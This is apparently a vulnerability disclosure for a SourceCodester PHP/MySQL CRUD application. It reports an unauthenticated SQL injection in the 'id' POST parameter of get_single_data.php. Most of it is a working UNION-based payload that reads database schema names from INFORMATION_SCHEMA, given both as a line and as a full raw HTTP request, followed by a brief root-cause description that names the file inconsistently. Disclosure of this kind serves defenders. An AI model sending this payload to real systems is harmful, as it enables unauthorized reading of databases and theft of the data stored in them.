# CRUD (Create, Read, Update, Delete) Without Page Reload/Refresh Using PHP and MySQL with Source Code - SQL injection vulnerability

### You do not need to log in to the website to remotely trigger SQL injection vulnerabilities!

Supplier:https://www.sourcecodester.com/php/17146/crud-create-read-update-delete-without-page-reloadrefresh-using-php-and-mysql-source-code

http://localhost/get_single_data.php   -----> POST -----> 'id' can control some id parameters

Payload:id=-8845' UNION ALL SELECT (SELECT CONCAT(0x01,IFNULL(CAST(schema_name AS CHAR),0x20),0x01) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 12,1),NULL,NULL,NULL,NULL-- -

Running this payload will display the name of the database. This indicates that the malicious SQL statement has been successfully executed in the database, allowing database UNION query queries.

```r
POST /get_single_data.php HTTP/1.1
Host: xxxxxxxx
Content-Type: application/x-www-form-urlencoded
Content-Length: 160

id=-8845' UNION ALL SELECT (SELECT CONCAT(0x01,IFNULL(CAST(schema_name AS CHAR),0x20),0x01) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 12,1),NULL,NULL,NULL,NULL-- -
```

![1](/img/4.png)

The include method in the second line of the get_single.data.php file in the root directory of the website retrieves user input from the POST element. Then, the value of this element will be passed to the code without proper purification or validation, and ultimately used for database queries in the include method on line 4 of the get_single.data.php file, leading to SQL injection attacks.

![2](/img/5.png)
